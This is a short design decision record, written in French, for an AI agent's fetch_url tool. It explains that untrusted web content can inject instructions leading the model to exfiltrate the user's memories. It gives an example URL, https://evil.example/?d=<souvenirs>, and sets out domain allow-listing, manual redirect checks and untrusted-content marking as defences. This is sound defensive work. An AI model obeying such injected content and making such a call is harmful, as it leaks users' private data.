# `fetch_url` sans confirmation seulement vers un domaine écrit par l'utilisateur

L'outil `fetch_url` est un canal d'exfiltration : une page web, ou tout autre contenu non fiable, peut amener le modèle à appeler `https://evil.example/?d=<souvenirs>`. Un appel ne s'exécute donc sans confirmation que si son hôte est un domaine autorisé, c'est-à-dire un domaine (ou l'un de ses sous-domaines) apparaissant dans un message écrit par l'utilisateur dans la conversation en cours, sur tout son historique, ou dans la consigne de la tâche planifiée ; les messages de l'agent et les résultats d'outils n'en ajoutent jamais. Tout autre appel est une écriture sensible. Les redirections sont suivies à la main (5 au plus) et la règle est revérifiée à chaque saut ; seules les URL `https` vers des adresses publiques sont acceptées, avec un timeout de 15 s et une réponse plafonnée. Nous avons préféré cette règle à une confirmation systématique, qui rendrait les tâches planifiées inutilisables.

## Consequences

- Ne pas élargir la liste aux domaines cités par l'agent ou trouvés dans une page, ni suivre les redirections automatiquement : chacun rouvre la fuite.
- Le contenu récupéré est délimité et déclaré non fiable dans le prompt système, mais ce n'est qu'une atténuation : la barrière, c'est cette règle et les confirmations.
